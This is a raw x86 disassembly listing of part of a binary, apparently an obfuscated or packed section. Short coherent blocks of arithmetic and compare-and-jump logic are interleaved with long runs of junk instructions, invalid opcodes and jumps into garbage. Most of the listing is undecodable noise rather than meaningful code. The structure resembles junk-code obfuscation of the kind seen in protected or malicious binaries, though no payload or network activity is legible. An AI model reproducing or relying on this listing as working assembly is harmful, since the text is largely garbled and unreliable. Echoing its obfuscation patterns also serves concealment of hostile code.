  404228:	test   al,0x29
  40422a:	push   edi
  40422b:	je     0x404282
  40422d:	sub    eax,0xb39e3057
  404232:	ins    DWORD PTR es:[edi],dx
  404233:	lock add cl,BYTE PTR [eax]
  404236:	sbb    al,0x2e
  404238:	and    ah,BYTE PTR [ebx-0x5]
  40423b:	fs scas eax,DWORD PTR es:[edi]
  40423d:	cmp    BYTE PTR [ecx-0x51],ah
  404240:	adc    al,0x16
  404242:	add    DWORD PTR [ebx+0x54],esi
  404245:	jno    0x404261
  404247:	or     eax,0x2f4204f4
  40424c:	xor    edx,eax
  40424e:	xor    edi,eax
  404250:	jmp    0x4043fa
  404255:	xchg   ebp,eax
  404256:	push   0xffffffb8
  404258:	int3   
  404259:	jns    0x404237
  40425b:	imul   eax,DWORD PTR gs:[ebp+eax*4+0x27],0x15
  404261:	sub    DWORD PTR [ebp+0x11],esp
  404264:	sahf   
  404265:	in     eax,dx
  404266:	push   ss
  404267:	jle    0x4042e7
  404269:	mov    edi,DWORD PTR [edi+0x7e]
  40426c:	jle    0x404224
  40426e:	(bad)  
  40426f:	shl    BYTE PTR [ecx],1
  404271:	jb     0x4042cb
  404273:	cmc    
  404274:	iret   
  404275:	idiv   DWORD PTR [ebx-0x18]
  404278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404279:	mov    ah,0xb9
  40427b:	es adc ah,0xe3
  40427f:	adc    ah,BYTE PTR [esi]
  404281:	push   ecx
  404282:	adc    al,0xa7
  404284:	push   ecx
  404285:	mov    dl,0x4d
  404287:	cmp    BYTE PTR [ebx+0x2acd72ef],ch
  40428d:	mov    dl,0xe7
  40428f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404290:	and    ah,BYTE PTR [edx-0x699615f6]
  404296:	push   esp
  404297:	fild   DWORD PTR [ebx+eax*1+0xe689e73]
  40429e:	clc    
  40429f:	(bad)  
  4042a0:	adc    DWORD PTR [esi+0x2a],ecx
  4042a3:	shl    al,cl
  4042a5:	scas   al,BYTE PTR es:[edi]
  4042a6:	xchg   esi,eax
  4042a7:	mov    ds:0x53209d43,al
  4042ac:	jg     0x40426d
  4042ae:	inc    ecx
  4042af:	xchg   ecx,eax
  4042b0:	loopne 0x404286
  4042b2:	add    BYTE PTR [edx+0x27328e5e],0x99
  4042b9:	es lahf 
  4042bb:	ja     0x404316
  4042bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042be:	cmp    dh,BYTE PTR ds:0x3e168ecf
  4042c4:	pop    eax
  4042c5:	stos   DWORD PTR es:[edi],eax
  4042c6:	mov    ebp,0x149c6228
  4042cb:	inc    edi
  4042cc:	test   BYTE PTR [ecx-0x8],0x43
  4042d0:	mov    eax,ds:0x33890343
  4042d5:	add    DWORD PTR [ecx-0x2293acfe],edx
  4042db:	sub    BYTE PTR [edi],cl
  4042dd:	int3   
  4042de:	sub    dl,bl
  4042e0:	loopne 0x4042c2
  4042e2:	or     edx,DWORD PTR [eax+0x52c33ffc]
  4042e8:	stc    
  4042e9:	pop    es
  4042ea:	cdq    
  4042eb:	loope  0x404305
  4042ed:	cdq    
  4042ee:	inc    edi
  4042ef:	mov    eax,ds:0x72b5ca80
  4042f4:	out    dx,al
  4042f5:	outs   dx,BYTE PTR ds:[esi]
  4042f6:	pop    esp
  4042f7:	cmp    BYTE PTR [eax],0x8c
  4042fa:	int    0xc7
  4042fc:	bound  esp,QWORD PTR [edx+0xa]
  4042ff:	jb     0x404298
  404301:	bound  edx,QWORD PTR [ebp-0x30]
  404304:	mov    ah,0x1
  404306:	fldcw  WORD PTR [ecx-0x19bbd847]
  40430c:	imul   esp,DWORD PTR [edx+0x60],0xd
  404310:	mov    cl,0x44
  404312:	ret    
  404313:	push   esp
  404314:	lahf   
  404315:	icebp  
  404316:	aad    0xe2
  404318:	cmp    DWORD PTR [eax+0x3f],eax
  40431b:	xchg   DWORD PTR [esi-0x5f5a8fcf],ecx
  404321:	xchg   BYTE PTR [ebx+0x18],dl
  404324:	test   DWORD PTR [ebp-0x56],esi
  404327:	pop    esi
  404328:	xchg   BYTE PTR [ecx-0x5d],bl
  40432b:	imul   edx,DWORD PTR [bx+si],0xfffffff0
  40432f:	or     BYTE PTR [ebp+edi*2+0x75],0x52
  404334:	fist   DWORD PTR [esi]
  404336:	jae    0x40434b
  404338:	sub    DWORD PTR [ebx+ebx*2+0x19658eac],ecx
  40433f:	pop    ss
  404340:	imul   edi,DWORD PTR [esi],0xd169205
  404346:	popf   
  404347:	das    
  404348:	sahf   
  404349:	inc    esp
  40434a:	cdq    
  40434b:	into   
  40434c:	ins    DWORD PTR es:[edi],dx
  40434d:	test   eax,0x85aa262
  404352:	cmc    
  404353:	test   BYTE PTR cs:[esi+0x41c42706],bh
  40435a:	and    eax,0x2a4ada51
  40435f:	test   BYTE PTR [eax],bh
  404361:	sar    BYTE PTR ds:0x6b2b6934,1
  404367:	retf   0x10db
  40436a:	pop    edi
  40436b:	jg     0x4043b9
  40436d:	jns    0x404366
  40436f:	mov    ecx,DWORD PTR [ebp-0x128f4a87]
  404375:	pop    esp
  404376:	pop    ss
  404377:	(bad)  
  404378:	mov    esp,0x21e483fd
  40437d:	sahf   
  40437e:	pop    esp
  40437f:	push   ebp
  404380:	mov    ch,0x49
  404382:	adc    ah,ah
  404384:	clc    
  404385:	add    al,BYTE PTR [ecx+0x24]
  404388:	fldenv ds:0xed2e954f
  40438e:	js     0x4043e3
  404390:	aad    0x27
  404392:	pop    edx
  404393:	push   eax
  404394:	dec    esi
  404395:	xor    ch,BYTE PTR [esi-0x23719e00]
  40439b:	sub    al,0x5b
  40439d:	cs enter 0x4603,0x9b
  4043a2:	dec    ecx
  4043a3:	(bad)  
  4043a4:	pushf  
  4043a5:	jp     0x404375
  4043a7:	jae    0x4043df
  4043a9:	sbb    BYTE PTR [edx*8+0x205ddeed],ah
  4043b0:	out    0xf6,eax
  4043b2:	dec    esi
  4043b3:	xchg   edx,eax
  4043b4:	pushf  
  4043b5:	push   esi
  4043b6:	fnsave [ebx+0x41730875]
  4043bc:	adc    eax,0x1ef02879
  4043c1:	push   ecx
  4043c2:	push   ebx
  4043c3:	data16 int3 
  4043c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043c6:	jg     0x404398
  4043c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043c9:	(bad)
  4043cc:	xlat   BYTE PTR ds:[ebx]
  4043cd:	sbb    ch,BYTE PTR [edx-0x7d]
  4043d0:	cli    
  4043d1:	retf   0x534f
  4043d4:	lds    edi,FWORD PTR [ebx+0x4e3cb4ba]
  4043da:	mov    WORD PTR [edx+0x25b05f07],fs
  4043e0:	pusha  
  4043e1:	xor    eax,0xb275e24e
  4043e6:	adc    dl,BYTE PTR [edi+0x6a1bcb40]
  4043ec:	adc    edi,0xffffff93
  4043ef:	ins    DWORD PTR es:[edi],dx
  4043f0:	mov    bl,BYTE PTR [edi+eiz*1-0x73]
  4043f4:	and    BYTE PTR [ecx],ah
  4043f6:	mov    edi,0x3490c10
  4043fb:	stc    
  4043fc:	add    edx,ecx
  4043fe:	imul   edx,edi
  404401:	mov    edi,DWORD PTR [ebp-0x8]
  404404:	mov    ebx,DWORD PTR [ebp-0x10]
  404407:	sub    ebx,edi
  404409:	cmp    ebx,edx
  40440b:	ja     0x404419
  404411:	mov    edx,DWORD PTR [ebp-0x30]
  404414:	jmp    0x404613
  404419:	mov    edx,DWORD PTR [ebp-0x38]
  40441c:	mov    edi,DWORD PTR [ebp-0x4]
  40441f:	xor    edx,eax
  404421:	xor    edi,eax
  404423:	add    edi,ecx
  404425:	add    edx,ecx
  404427:	imul   edx,edi
  40442a:	mov    edi,DWORD PTR [ebp-0x8]
  40442d:	mov    ebx,DWORD PTR [ebp-0x10]
  404430:	sub    ebx,edi
  404432:	cmp    ebx,edx
  404434:	ja     0x4045ec
  40443a:	jmp    0x4045e4
  40443f:	hlt    
  404440:	mov    ah,0xbf
  404442:	add    bh,BYTE PTR [edi+0x42444505]
  404448:	pop    ecx
  404449:	mov    ds:0xaded54df,al
  40444e:	lods   al,BYTE PTR ds:[esi]
  40444f:	jp     0x404468
  404451:	jle    0x4044d1
  404453:	mov    edi,DWORD PTR [edi+0x7e]
  404456:	jle    0x404429
  404458:	mov    dh,0x74
  40445a:	mov    WORD PTR ds:0xe9fe67b0,ss
  404460:	aam    0xc8
  404462:	push   ebx
  404463:	jbe    0x40444c
  404465:	mov    ebx,ds
  404467:	jl     0x4044a5
  404469:	jmp    0x404422
  40446b:	mov    dl,0xbb
  40446d:	int3   
  40446e:	sbb    edx,esi
  404470:	mov    ch,0x54
  404472:	sbb    bl,cl
  404474:	mov    ebx,0xb5f1e337
  404479:	(bad)
  40447c:	mov    bh,0xe
  40447e:	(bad)  
  40447f:	pop    ss
  404480:	xor    DWORD PTR [ebx+eax*2-0x6dd59b1e],esp
  404487:	leave  
  404488:	dec    edx
  404489:	stc    
  40448a:	mov    al,0xfc
  40448c:	push   0x35b2b47
  404491:	cmp    BYTE PTR [edx],al
  404493:	mov    BYTE PTR [esi-0x68],ah
  404496:	mov    edi,0xbfdca6ff
  40449b:	enter  0x3787,0xa4
  40449f:	pop    es
  4044a0:	xor    eax,0x657e9a82
  4044a5:	mov    DWORD PTR [esi+0x3c],0x4019d541
  4044ac:	adc    eax,0x15c13513
  4044b1:	jge    0x404445
  4044b3:	(bad)  
  4044b4:	into   
  4044b5:	mov    ds:0x7195dff,al
  4044ba:	nop
  4044bb:	retf   
  4044bc:	add    DWORD PTR [ebp+ebp*4-0x4d97dee],0x76a6c0fb
  4044c7:	jno    0x404523
  4044c9:	jb     0x40450d
  4044cb:	sbb    DWORD PTR ds:0x846d9332,0x5e622780
  4044d5:	inc    ecx
  4044d6:	push   0xffffffa5
  4044d8:	pop    ecx
  4044d9:	and    ebp,DWORD PTR [edx-0x258236c1]
  4044df:	stos   BYTE PTR es:[edi],al
  4044e0:	adc    ch,dl
  4044e2:	jecxz  0x40447e
  4044e4:	sar    ecx,0xa9
  4044e7:	inc    esi
  4044e8:	repz out 0x8b,eax
  4044eb:	mov    ch,0x77
  4044ed:	pop    es
  4044ee:	inc    ebp
  4044ef:	aas    
  4044f0:	sub    bl,bl
  4044f2:	inc    edi
  4044f3:	int    0xd
  4044f5:	(bad)  
  4044f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044f7:	mov    bl,BYTE PTR [ebx-0x3f]
  4044fa:	fisub  DWORD PTR [ebx-0x78]
  4044fd:	out    dx,eax
  4044fe:	(bad)  
  4044ff:	retf   
  404500:	(bad)  [eax]
  404502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404503:	std    
  404504:	sbb    cl,BYTE PTR [eax-0x36fcc953]
  40450a:	cmp    cl,BYTE PTR [eax]
  40450c:	sbb    DWORD PTR [edx-0x5bdf64d0],edx
  404512:	sub    BYTE PTR [eax+0x2e],bl
  404515:	fcomp  DWORD PTR [edx-0x1]
  404518:	pushf  
  404519:	nop
  40451a:	jno    0x40450a
  40451c:	adc    ah,BYTE PTR [eax+0x4ccbcf3c]
  404522:	jmp    0x4044df
  404524:	xor    dh,dh
  404526:	dec    esp
  404527:	js     0x404522
  404529:	out    dx,eax
  40452a:	push   cs
  40452b:	jge    0x404556
  40452d:	inc    edx
  40452e:	add    dh,0xc9
  404531:	iret   
  404532:	jno    0x404554
  404534:	stos   DWORD PTR es:[edi],eax
  404535:	div    DWORD PTR [ecx+0x1741b513]
  40453b:	mov    edi,0x6ff80a60
  404540:	ds fxch st(2)
  404543:	ins    DWORD PTR es:[edi],dx
  404544:	mov    BYTE PTR [eax-0x62],ch
  404547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404548:	mov    esi,0xfd74d81a
  40454d:	mov    ebp,0xd0c98db0
  404552:	mov    dh,0xd5
  404554:	fwait
  404555:	aas    
  404556:	mov    WORD PTR [ebx],ss
  404558:	in     eax,dx
  404559:	mov    BYTE PTR [esi],dl
  40455b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40455c:	addr16 retf 0x5a43
  404560:	dec    esi
  404561:	sub    dh,BYTE PTR [ebx-0x110a3b66]
  404567:	imul   esi,DWORD PTR [ecx],0x5fc23963
  40456d:	fidivr DWORD PTR [eax]
  40456f:	mov    ebp,0x1143bc19
  404574:	mov    BYTE PTR [ebx+0x2a],ch
  404577:	mov    ebx,DWORD PTR [edi-0x5b1d6b07]
  40457d:	dec    esi
  40457e:	test   DWORD PTR [eax],ebp
  404580:	leave  
  404581:	rcl    DWORD PTR [esi],0x50
  404584:	inc    ebx
  404585:	bound  eax,QWORD PTR ss:[ebx+0xa90ffdc]
  40458c:	sub    al,0x8
  40458e:	je     0x40457e
  404590:	dec    ebx
  404591:	fisttp DWORD PTR [eax+0x7afc08f]
  404597:	mov    dh,BYTE PTR [ebp-0x24]
  40459a:	push   esp
  40459b:	pusha  
  40459c:	cmp    dh,BYTE PTR [ebp+0x1d]
  40459f:	push   eax
  4045a0:	std    
  4045a1:	inc    esp
  4045a2:	cmp    edi,ebp
  4045a4:	enter  0x1b79,0x45
  4045a8:	call   0x6cbdecac
  4045ad:	sub    BYTE PTR [edx+0x77ea4a72],0x48
  4045b4:	sbb    BYTE PTR [ebp-0xe3d762d],0x3a
  4045bb:	xchg   DWORD PTR [ebp-0x69dcda76],ebx
  4045c1:	lds    esp,FWORD PTR [esi]
  4045c3:	jmp    0x5427:0x2b2fc83
  4045ca:	push   ecx
  4045cb:	xchg   bh,cl
  4045cd:	pushf  
  4045ce:	in     eax,dx
  4045cf:	in     al,dx
  4045d0:	mov    eax,0x4de5ffd
  4045d5:	sub    eax,0x42c29f87
  4045da:	mov    cl,0x88
  4045dc:	call   0xe3c7:0xa1f7f4f7
  4045e3:	mov    eax,0xe9cc558b
  4045e8:	daa    
  4045e9:	add    BYTE PTR [eax],al
  4045eb:	add    BYTE PTR [ebx+0x7d8bc455],cl
  4045f1:	cld    
  4045f2:	xor    edx,eax
  4045f4:	xor    edi,eax
  4045f6:	add    edx,ecx
  4045f8:	add    edi,ecx
  4045fa:	imul   edx,edi
  4045fd:	mov    edi,DWORD PTR [ebp-0x8]
  404600:	mov    ebx,DWORD PTR [ebp-0x10]
  404603:	sub    ebx,edi
  404605:	cmp    ebx,edx
  404607:	mov    edx,DWORD PTR [ebp-0x38]
  40460a:	jbe    0x404613
  404610:	mov    edx,DWORD PTR [ebp-0x3c]
  404613:	mov    edi,DWORD PTR [ebp-0x4]
  404616:	xor    edi,eax
  404618:	xor    edx,eax
  40461a:	add    edi,ecx
  40461c:	add    edx,ecx
  40461e:	imul   edx,edi
  404621:	mov    DWORD PTR [ebp+0xc],edx
  404624:	mov    edx,DWORD PTR [ebp+0xc]
  404627:	mov    DWORD PTR [ebp-0x24],edx
  40462a:	mov    edx,DWORD PTR [ebp-0x8]
  40462d:	add    edx,DWORD PTR [ebp-0x40]
  404630:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  404637:	mov    DWORD PTR [ebp-0x1c],edx
  40463a:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404641:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404648:	mov    edx,DWORD PTR [ebp-0x18]
  40464b:	xor    edx,eax
  40464d:	add    edx,ecx
  40464f:	jmp    0x404d64
  404654:	mov    edx,DWORD PTR [ebp-0x18]
  404657:	jmp    0x404801
  40465c:	dec    esi
  40465d:	(bad)  
  40465e:	(bad)  
  40465f:	push   edi
  404660:	dec    esi
  404661:	push   edi
  404662:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  404664:	xor    BYTE PTR [edx-0x4b940d0],al
  40466a:	xchg   ecx,eax
  40466b:	pop    edx
  40466c:	imul   DWORD PTR [ecx]
  40466e:	jle    0x4046ee
  404670:	mov    edi,DWORD PTR [edi+0x7e]
  404673:	jle    0x40465a
  404675:	fstp   TBYTE PTR [esp+edi*4+0x33]
  404679:	dec    edx
  40467a:	(bad)  
  40467c:	push   0xe80c07d7
  404681:	push   edx
  404682:	mov    ebx,0x90db55d1
  404687:	or     ecx,DWORD PTR [esi]
  404689:	inc    edx
  40468a:	xlat   BYTE PTR ds:[ebx]
  40468b:	and    bl,BYTE PTR [eax+0x14caee1d]
  404691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404692:	xchg   esp,eax
  404693:	imul   eax,esi,0x62
  404696:	pop    es
  404697:	jnp    0x404691
  404699:	dec    edx
  40469a:	mov    edx,0xae91950e
  40469f:	in     al,dx
  4046a0:	cmc    
  4046a1:	jg     0x40465d
  4046a3:	push   es
  4046a4:	in     al,dx
  4046a5:	mov    WORD PTR [edx+0x17],?
  4046a8:	or     al,0x30
  4046aa:	ds in  eax,0xe6
  4046ad:	jecxz  0x4046d4
  4046af:	cwde   
  4046b0:	push   edi
  4046b1:	mov    ch,0x10
  4046b3:	or     DWORD PTR [ecx+eiz*2-0x62],edi
  4046b7:	cmp    dl,BYTE PTR [eax-0x73f2976a]
  4046bd:	es push ecx
  4046bf:	aam    0xd2
  4046c1:	leave  
  4046c2:	jecxz  0x404675
  4046c4:	mov    esi,0x98f0a415
  4046c9:	jo     0x404740
  4046cb:	mov    bl,0x59
  4046cd:	repz aas 
  4046cf:	pushf  
  4046d0:	(bad)  
  4046d1:	mov    edi,0x29d46e45
  4046d6:	outs   dx,DWORD PTR es:[esi]
  4046d8:	push   ebx
  4046d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046da:	xor    ecx,DWORD PTR [ecx+0x4b]
  4046dd:	add    esi,ecx
  4046df:	rcr    ecx,0xe1
  4046e2:	jl     0x40469c
  4046e4:	xchg   ecx,eax
  4046e5:	push   ss
  4046e6:	push   ebx
  4046e7:	jle    0x404722
  4046e9:	pop    eax
  4046ea:	adc    al,0x86
  4046ec:	mov    ?,WORD PTR [esi+0x30]
  4046ef:	(bad)  
  4046f0:	mov    esi,0x538d9c46
  4046f5:	loope  0x4046ad
  4046f7:	daa    
  4046f8:	stos   BYTE PTR es:[edi],al
  4046f9:	cmp    eax,ecx
  4046fb:	pop    ebx
  4046fc:	adc    al,0x13
  4046fe:	xchg   esi,eax
  4046ff:	ins    BYTE PTR es:[edi],dx
  404700:	pop    esp
  404701:	push   0x7988668c
  404706:	xchg   edx,eax
  404707:	add    DWORD PTR [ebp+ebp*8+0x69],ebx
  40470b:	scas   eax,DWORD PTR es:[edi]
  40470c:	call   0xf1f26c27
  404711:	fsubrp st(1),st
  404713:	cmp    edi,eax
  404715:	adc    BYTE PTR [edi+0x2e],0xa4
  404719:	cmp    ah,BYTE PTR [ecx-0x35]
  40471c:	xchg   edx,eax
  40471d:	xor    al,0x4c
  40471f:	mov    esi,0x2ab30233
  404724:	leave  
  404725:	cmp    DWORD PTR [esi-0x12cdcb4c],ebp
  40472b:	or     dh,cl
  40472d:	xor    DWORD PTR [esi+0x4b],0xffffffe9
  404731:	scas   eax,DWORD PTR es:[edi]
  404732:	jge    0x404769
  404734:	int3   
  404735:	xor    al,0x95
  404737:	not    eax
  404739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40473a:	sub    ebx,esp
  40473c:	arpl   WORD PTR [ebx],sp
  40473e:	and    bh,BYTE PTR [eax]
  404740:	or     cl,cl
  404742:	dec    ebp
  404743:	fst    st(5)
  404745:	leave  
  404746:	cmp    ch,BYTE PTR [esi-0x60]
  404749:	jmp    0xb4f5b67a
  40474e:	or     BYTE PTR [edx+eiz*2-0x14],al
  404752:	jmp    0x5ab9:0xf4b45580
  404759:	in     al,dx
  40475a:	test   al,0x45
  40475c:	ins    BYTE PTR es:[edi],dx
  40475d:	push   ebp
  40475e:	xlat   BYTE PTR ds:[ebx]
  40475f:	ins    BYTE PTR es:[edi],dx
  404760:	sub    DWORD PTR [eax+edx*4],eax
  404763:	in     al,0x80
  404765:	js     0x404723
  404767:	and    bl,BYTE PTR [esi]
  404769:	jl     0x4047b4
  40476b:	or     al,0xcb
  40476d:	add    eax,0xeb772014
  404772:	mov    ch,0x28
  404774:	inc    esp
  404775:	mov    DWORD PTR ds:0x8e67cb25,ecx
  40477b:	cmp    eax,0x4a1ad243
  404780:	jo     0x404790
  404782:	shl    ch,1
  404784:	mov    ah,0x38
  404786:	add    cl,0x43
  404789:	pop    eax
  40478a:	mov    cl,0x60
  40478c:	mov    dh,0x18
  40478e:	jbe    0x4047ca
  404790:	mov    DWORD PTR [eax-0x458ac202],edx
  404796:	rcr    BYTE PTR [edi+0x7a],1
  404799:	in     eax,0x77
  40479b:	out    0x41,eax
  40479d:	enter  0x9f72,0xf6
  4047a1:	clc    
  4047a2:	pop    ebp
  4047a3:	out    0xf5,eax
  4047a5:	add    al,dl
  4047a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047a8:	aas    
  4047a9:	in     al,0x65
  4047ab:	loope  0x4047b6
  4047ad:	rcl    BYTE PTR [edi+0x13],0xb
  4047b1:	sahf   
  4047b2:	outs   dx,BYTE PTR ds:[esi]
  4047b3:	and    eax,0x3fbce964
  4047b8:	jmp    0x40475f
  4047ba:	(bad)  
  4047bb:	push   edx
  4047bc:	in     al,dx
  4047bd:	rcr    DWORD PTR ds:[ebp-0xa],1
  4047c1:	xor    DWORD PTR [esi-0x3f2f1f4c],esp
  4047c7:	pop    esi
  4047c8:	jns    0x40474b
  4047ca:	adc    bh,BYTE PTR [edx+0x220de7f2]
  4047d0:	push   cs
  4047d1:	into   
  4047d2:	pop    ecx
  4047d3:	les    esi,FWORD PTR [ebp-0x749643e3]
  4047d9:	int3   
  4047da:	cwde   
  4047db:	jo     0x4047f7
  4047dd:	xchg   ebx,eax
  4047de:	pop    ds
  4047df:	sbb    DWORD PTR [edi+0x5b847036],edi
  4047e5:	sub    ecx,DWORD PTR [ebx+0x22]
  4047e8:	push   edx
  4047e9:	cmp    BYTE PTR [esi+eax*2+0x77be546e],0xd3
  4047f1:	test   BYTE PTR [ecx+0x16],dl
  4047f4:	mov    esp,0x8e4d2aff
  4047f9:	pusha  
  4047fa:	shr    DWORD PTR [esp+ecx*8+0x1f2ec4ea],1
  404801:	xor    edx,eax
  404803:	add    edx,DWORD PTR [ebp-0x14]
  404806:	mov    edi,DWORD PTR [ebp-0x1c]
  404809:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404810:	mov    BYTE PTR [ebp+0xf],dl
  404813:	mov    edx,DWORD PTR [ebp-0xc]
  404816:	jmp    0x4049c0
  40481b:	and    BYTE PTR [esi+0x5a2a321e],0x62
  404822:	add    WORD PTR [edx-0x1dc00f46],0xffc1
  40482a:	int    0x4
  40482c:	sub    edi,DWORD PTR [esi+0x7e]
  40482f:	mov    edi,DWORD PTR [edi+0x7e]
  404832:	jle    0x4047d6
  404834:	dec    DWORD PTR [ebx]
  404836:	dec    esp
  404837:	mov    ebx,0xf4f20258
  40483c:	push   ds
  40483d:	bound  ebx,QWORD PTR [ebx+0x5c]
  404840:	cdq    
  404841:	jne    0x404896
  404843:	sub    eax,0xce12820b
  404848:	sub    DWORD PTR [edi+0x16],0xffffffe1
  40484c:	aad    0x86
  40484e:	mov    WORD PTR [ebp-0x4fd91357],fs
  404854:	pop    ss
  404855:	or     DWORD PTR [edi],0x1e
  404858:	jge    0x404805
  40485a:	mov    ebp,0x1469b24d
  40485f:	adc    eax,0xe71d5812
  404864:	cwde   
  404865:	mov    edi,0xc92bbaca
  40486a:	cmp    DWORD PTR [ebx-0x6e],edi
  40486d:	sbb    BYTE PTR [ecx+ebx*2-0x491c9cfb],0x9b
  404875:	mov    esi,0xa8c8938c
  40487a:	cmp    DWORD PTR [esi+0x2c15cf79],esi
  404880:	jns    0x40488b
  404882:	ret    0x2947
  404885:	es dec edi
  404887:	daa    
  404888:	cmp    al,0x23
  40488a:	xor    dl,BYTE PTR [ebx]
  40488c:	ss xchg bx,ax
  40488f:	or     bl,BYTE PTR [ebp-0x25]
  404892:	mov    ah,0x26
  404894:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404895:	mov    cl,0x38
  404897:	xchg   eax,esi
  404899:	gs adc DWORD PTR es:[esi+0x1250311e],ebx
  4048a1:	rcl    bh,1
  4048a3:	and    DWORD PTR [esi+0x76],0x4b8381b4
  4048aa:	popa   
  4048ab:	fnstenv [edi+0x20]
  4048ae:	shl    DWORD PTR ds:0x91172daa,1
  4048b4:	adc    eax,0x4b7b1417
  4048b9:	mov    al,ds:0xc02d4896
  4048be:	mov    fs,WORD PTR [eax-0x553d1159]
  4048c4:	jle    0x404857
  4048c6:	bound  eax,QWORD PTR [esi+eiz*8+0x73f51baf]
  4048cd:	or     edx,DWORD PTR [ecx+0x2e]
  4048d0:	cmc    
  4048d1:	test   BYTE PTR [ecx+edx*8],ch
  4048d4:	xor    eax,0xe29287ea
  4048d9:	cmp    DWORD PTR [ecx-0x28],eax
  4048dc:	repz cld 
  4048de:	pop    eax
  4048df:	mov    dh,0x67
  4048e1:	fcmovnbe st,st(4)
  4048e3:	xchg   BYTE PTR [ecx],ah
  4048e5:	(bad)  
  4048e6:	test   eax,0x602f9763
  4048eb:	scas   eax,DWORD PTR es:[edi]
  4048ec:	mov    edx,0xbc6a426c
  4048f1:	leave  
  4048f2:	iret   
  4048f3:	fwait
  4048f4:	and    BYTE PTR [esi+0x3f],bh
  4048f7:	fild   QWORD PTR [esi]
  4048f9:	mov    ecx,0xf4e675dc
  4048fe:	mov    al,ds:0x6e5acb6a
  404903:	outs   dx,DWORD PTR ds:[esi]
  404904:	dec    ebp
  404905:	mov    esp,0xcdbac829
  40490a:	xchg   BYTE PTR [ecx+0xf],cl
  40490d:	xlat   BYTE PTR fs:[ebx]
  40490f:	xchg   edi,eax
  404910:	popa   
  404911:	gs aam 0xc1
  404914:	les    esi,FWORD PTR [eax+0x22]
  404917:	test   bh,ch
  404919:	jo     0x404988
  40491b:	in     al,dx
  40491c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40491d:	mov    bl,0xcc
  40491f:	or     eax,DWORD PTR [esi]
  404921:	bound  esp,QWORD PTR [esi+0x59e4ffe3]
  404927:	pop    ebx
  404928:	(bad)  
  404929:	ins    DWORD PTR es:[edi],dx
  40492a:	js     0x4048e5
  40492c:	mov    ebx,0x6c43997d
  404931:	sahf   
  404932:	inc    edi
  404933:	sub    BYTE PTR [ebx],al
  404935:	lea    ebx,[eax]
  404937:	inc    edi
  404938:	or     al,0x5e
  40493a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40493b:	jg     0x4048c3
  40493d:	mov    ebx,0x6f258ffd
  404942:	ret    
  404943:	pop    ss
  404944:	jae    0x4048cd
  404946:	ficomp DWORD PTR [ecx+ebx*1]
  404949:	aaa    
  40494a:	sub    eax,0xd0357cbf
  40494f:	js     0x4049bc
  404951:	pop    es
  404952:	dec    ecx
  404953:	popa   
  404954:	fistp  DWORD PTR [ebx+0x7622957]
  40495a:	push   ecx
  40495b:	mov    ?,WORD PTR [edx]
  40495d:	retf   0x17e8
  404960:	sti    
  404961:	sub    eax,0xbd556b1d
  404966:	call   0xe21c6167
  40496b:	in     eax,0xc5
  40496d:	push   es
  40496e:	mov    ds:0xb1c0b89a,eax
  404973:	mov    ds:0x39df38d9,al
  404978:	jecxz  0x404995
  40497a:	xor    BYTE PTR [eiz*2+0x6d044ad2],bl
  404981:	aam    0x2b
  404983:	sub    BYTE PTR [esi+0x52],ch
  404986:	frstor [ebp+0x1a]
  404989:	adc    ebp,DWORD PTR [ebp-0x79]
  40498c:	push   ecx
  40498d:	mov    edi,0x3f32d59
  404992:	add    bl,cl
  404994:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404995:	add    edi,DWORD PTR [ecx+esi*4+0x7adcd534]
  40499c:	sbb    eax,0xf82984a0
  4049a1:	mov    BYTE PTR [ecx-0x1f],dh
  4049a4:	sti    
  4049a5:	les    eax,FWORD PTR [ebx+edx*2+0x16]
  4049a9:	ss jne 0x4049ee
  4049ac:	popa   
  4049ad:	in     al,0x20
  4049af:	sar    BYTE PTR [edx-0x61],0x71
  4049b3:	test   al,0x92
  4049b5:	pushf  
  4049b6:	(bad)  
  4049b7:	lods   al,BYTE PTR ds:[esi]
  4049b8:	adc    al,0xde
  4049ba:	jb     0x404a21
  4049bc:	sub    al,0x41
  4049be:	scas   eax,DWORD PTR es:[edi]
  4049bf:	xchg   ecx,eax
  4049c0:	xor    edx,eax
  4049c2:	add    edx,DWORD PTR [ebp-0x14]
  4049c5:	jmp    0x404b6f
  4049ca:	test   BYTE PTR [ebp-0x13],cl
  4049cd:	xor    edi,ebp
  4049cf:	push   ebx
  4049d0:	mov    esp,0xd1280b5d
  4049d5:	xor    DWORD PTR ds:0x91bf892e,esp
  4049db:	sub    al,0x7e
  4049dd:	jle    0x40496a
  4049df:	jg     0x404a5f
  4049e1:	jle    0x404a5b
  4049e3:	add    ebp,edx
  4049e5:	dec    edx
  4049e6:	xchg   DWORD PTR [esi+0x47ade8f9],ebp
  4049ec:	or     al,0xc1
  4049ee:	pop    edi
  4049ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049f0:	add    al,0xb6
  4049f2:	and    BYTE PTR [edx-0xe],bh
  4049f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049f6:	pop    eax
  4049f7:	iret   
  4049f8:	fdiv   DWORD PTR [ecx]
  4049fa:	outs   dx,BYTE PTR ds:[esi]
  4049fb:	out    dx,al
  4049fc:	dec    eax
  4049fd:	ss mov esi,0x29feabfd
  404a03:	pop    esi
  404a04:	loop   0x404a13
  404a06:	scas   eax,DWORD PTR es:[edi]
